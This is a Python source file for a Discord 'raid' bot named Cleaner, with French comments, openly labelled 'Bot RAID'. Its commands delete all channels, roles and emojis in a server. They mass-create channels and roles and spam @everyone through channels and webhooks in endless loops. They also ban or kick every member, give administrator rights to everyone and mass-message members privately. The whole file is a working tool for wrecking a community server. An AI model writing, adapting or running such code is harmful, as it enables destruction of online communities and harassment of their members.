import discord
import asyncio
import colorama
import json
import random
import os
from discord.ext import commands
from discord import Permissions
from discord import Webhook

Intents = discord.Intents.all()
Intents.messages = True

client = commands.Bot(command_prefix="*", intents=Intents, help_command=None)
client.remove_command('help')

######################################setup########################################

channel_names = '🧹🧼', '🧹🧼'  #NOMS DES SALONS
message_spam = '@everyone', '@everyone', '@everyone', #MESSAGE DE SPAMS
webhook_names = ['Cleaner 🧹', 'Cleaner 🧹']  #NOMS DES WEEBHOOK



###################################################################################
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name=" nettoyé 🧼 ...") # STATUT DU ROBOT
                               )  
  print(f''' 

██████╗ ██████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗╚════██╗██║  ██║██╔════╝██╔══██╗
██║  ██║ █████╔╝███████║█████╗  ██████╔╝
██║  ██║ ╚═══██╗╚════██║██╔══╝  ██╔══██╗
██████╔╝██████╔╝     ██║██║     ██║  ██║
╚═════╝ ╚═════╝      ╚═╝╚═╝     ╚═╝  ╚═╝

═══════════════════════════
Connecter avec {client.user}
34Press | Bot RAID
Developper par d34fr | Déa
Prefix : *
═══════════════════════════
''')


######################################## PARTIE 1


## NUKE
@client.command()
async def nuke(ctx, amount=50):
  await ctx.message.delete()
  await ctx.guild.edit(name="Serveur Propre 🧹🧼")  #NOM DU SERVEUR
  print("DESTRUCTION DU SERVEUR...\n")
  channels = ctx.guild.channels
  for channel in channels:
    try:
      await channel.delete()
      print(f"\x1b[38;5;34m 🧹 | Salon Supprimé ! / {channel.name}")
    except:
      pass
      print("\x1b[38;5;196m❌| Impossible de Supprimer le Salon !")
      guild = ctx.message.guild
  for i in range(amount):
    try:
      await ctx.guild.create_text_channel(random.choice(channel_names))
      print(f"\x1b[38;5;34m✅ | Salon crée ! / Numéro : {i}")
    except:
      print("\x1b[38;5;196m❌| Impossible de Crée le Salon !")
  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(
          f"\x1b[38;5;34m{role.name} \x1b[38;5;34m🧹| Les rôles on bien été supprimé !"
      )

    except:
      print(f"\x1b[38;5;196m❌| Impossible de supprimé un rôle ! / {role.name}")
  await asyncio.sleep(2)
  for i in range(100):
    for i in range(1000):
      for channel in ctx.guild.channels:
        try:
          await channel.send(random.choice(message_spam))
          print(
              f"\x1b[38;5;34m✅| Le message a bien été envoyé dans : {channel.name} !"
          )
        except:
          print(
              f"\x1b[38;5;196m❌| Impossible de mentionner dans : {channel.name} !"
          )
    for member in ctx.guild.members:
      if member.id != 847570148198318120:
        try:
          await member.ban(reason="🧹🧼")  #Raison BAN
          print(
              f"\x1b[38;5;34m✅| {member.name} a bien été banni de {ctx.guild.name} !"
          )
        except:
          print(
              f"\x1b[38;5;196m❌| Impossible de bannir {member.name} dans {ctx.guild.name} !"
          )


## Spam All
@client.command(pass_context=True)
async def spam(ctx, num, *, message):
  await ctx.message.delete()
  num = int(num)
  for a in range(num):
    for channel in ctx.guild.channels:
      await channel.send(message)


## Emoji Delete
@client.command(pass_context=True)
async def ed(ctx):
  await ctx.message.delete()
  for emoji in list(ctx.guild.emojis):
    try:
      await emoji.delete()
      print("SUPPRESION DES EMOJIS...\n")
      print(
          f"\x1b[38;5;34m✅|{emoji.name} a bien été supprimé dans {ctx.guild.name} !"
      )
    except:
      print(
          f"\x1b[38;5;196m❌| Impossible de supprimé {emoji.name} dans {ctx.guild.name} !"
      )


######################################## PARTIE 2

## Mass Channel
@client.command(pass_context=True)
async def mc(ctx, amount=50):
  await ctx.message.delete()
  for i in range(amount):
    try:
      await ctx.guild.create_text_channel(random.choice(channel_names))
      print(f"\x1b[38;5;34m✅ | Salon crée ! / Numéro : {i}")
    except:
      print("\x1b[38;5;196m❌| Impossible de Crée le Salon !")
  

## Mass Roles
@client.command()
async def mr(ctx, amout=10):
  await ctx.message.delete()
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"🧹🧼")  #NON DU ROLE SPAM
      print(
          f"\x1b[38;5;34m✅| Le rôle spam a bien été crée dans {ctx.guild.name} !"
      )
    except:
      print(
          f"\x1b[38;5;196m❌| Impossible de crée le rôle spam dans {ctx.guild.name} !"
      )


## Delete Channel
@client.command(pass_context=True)
async def dc(ctx):
  await ctx.message.delete()
  print("SUPPRESSION DES SALONS...\n")
  i = 0
  for c in ctx.guild.channels:
    i = i + 0
    await c.delete()
    print(f"\x1b[38;5;34m✅| Salon supprimé ! {i}")
  print("Done !")
  await ctx.guild.create_text_channel("Bien_propre🧹")
  print("\x1b[38;5;34m✅| Le Salon a bien été crée !")


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(message_spam))


@client.event
async def on_guild_channel_create(channel):
  webhook = await channel.create_webhook(name=random.choice(webhook_names))
  while True:
    await channel.send(random.choice(message_spam))
    await webhook.send(random.choice(message_spam),
                       username=random.choice(webhook_names))


## Delete Roles
@client.command(pass_context=True)
async def dr(ctx):
  await ctx.message.delete()
  for role in ctx.guild.roles:
    try:
      await role.delete()
      print(
          f"\x1b[38;5;34m{role.name} \x1b[38;5;34m🧹| Les rôles on bien été supprimé !"
      )

    except:
      print(f"\x1b[38;5;196m❌| Impossible de supprimé un rôle ! / {role.name}")
      
######################################## PARTIE 3


## Ban All
@client.command()
async def banall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    if member.id != 1:
      for user in list(ctx.guild.members):
        try:
          await ctx.guild.ban(user)
          print(
              f"\x1b[38;5;34m✅| {member.name} a bien été banni dans {ctx.guild.name} !"
          )
        except:
          print(
              f"\x1b[38;5;196m❌| Impossible de bannir {member.name} dans {ctx.guild.name} !"
          )


## Kick All
@client.command()
async def kickall(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.kick(reason="🧹🧼")  #NOM DE LA RAISON DU KICK
      print(
          f"\x1b[38;5;34m✅| {member.name} a bien été kick dans {ctx.guild.name} !"
      )
    except:
      print(
          f"\x1b[38;5;196m❌| Impossible de bannir {member.name} dans {ctx.guild.name} !"
      )


# Rename
@client.command(pass_context=True)
async def rename(ctx, *, name):
  await ctx.message.delete()
  num = 0
  for member in ctx.guild.members:
    try:
      await member.edit(nick=name)
      print(f"\x1b[38;5;34m✅| {member} a bien été renommé !")
      num += 1
    except:
      print(f"\x1b[38;5;196m❌| Impossible de renommer {member} !")
  print(f"\n\x1b[38;5;34m✅| Tout les membres on été renommé ! {num} au total.")


# Admin
@client.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
    if role.name == '@everyone':
      try:
        await role.edit(permissions=Permissions.all())
        print(
            f"\x1b[38;5;34m✅| Tout les membres on bien eu la permission admin dans {ctx.guild.name} !"
        )
      except:
        print(
            f"\x1b[38;5;196m❌| Impossible de donner la permission admin a tout les membres dans {ctx.guild.name} !"
        )


# Dm
@client.command()
async def dm(ctx, *, message: str):
  await ctx.message.delete()
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      print(
          f"\x1b[38;5;34m\x1b[38;5;34m✅| Tout les membres sont DM dans {ctx.guild.name} !"
      )
    except:
      print(
          f"\x1b[38;5;196m❌| Impossible de DM les membres dans {ctx.guild.name} !"
      )


######################################## PARTIE 4

# Create 
@client.command(pass_context=True)
async def create(ctx, name):
    await ctx.message.delete()
    await ctx.guild.create_role(name=name, mentionable=True, permissions=Permissions.all())
    print(
      f"\x1b[38;5;34m✅| Le rôle a bien été crée !")

# Add
@client.command(pass_context=True) 
async def add(ctx, user: discord.Member, role: discord.Role):
    await ctx.message.delete()
    await user.add_roles(role)
    print(
      f"\x1b[38;5;34m✅| Le rôle a bien été ajouté a {user} !"
    )

######################################## MENU D'AIDE
@client.command()
async def help(ctx, *args):
  await ctx.message.delete()
  Info = str(
      """\n**Prefix : `*`**\n**DEV : `d34fr` **\n**Language : `Python`**\n\n**__Commandes :__**\n`*nuke` | Detruit tout les salons et en crée plein d'autre en spammant un message.\n`*spam [nombre] [message]` | Spam un message voulu dans tout les salons.\n`*ed` | Supprime tout les emojis.\n\n`*mc` | Crée plein de salons.\n`*mr` | Crée plein de rôles\n`*dc` | Supprime tout les salons.\n`*dr` | Supprime tout les rôles.\n\n`*banall` | Ban tout les membres du serveur.\n`*kickall` | Kick tout les membres du serveur.\n`*rename [nom]` | Rename tout les membres du serveur.\n`*admin` | Mets admin tout les membres du serveur.\n`*dm [message]` | Spam un message en privé a tout les membres du serveur.\n\n`*create [nom]` | Crée un rôle avec permissions admin.\n`*add [membre] [role]` | Ajoute un rôle a un membre."""
    
  )
  
  embed = discord.Embed(color=14177041, title="Cleaner 🧹🧼 | Menu d'Aide")
  embed.add_field(name="**__Informations :__**", value=Info)
  embed.set_footer(text=f"Cleaner - Par d34fr | Demander par {ctx.author}", icon_url = "https://cdn.discordapp.com/attachments/1252396181548695614/1252401729626964139/8f597ab0b331e9f8f084298c4bba2f6c.webp?ex=66721580&is=6670c400&hm=0a3aa960762a00c8a5e620d645b0a028d24af2351e3b1e945695d35af4d89ccb&")  

  await ctx.send(embed=embed)


client.run("TOKEN")  #Token du bot
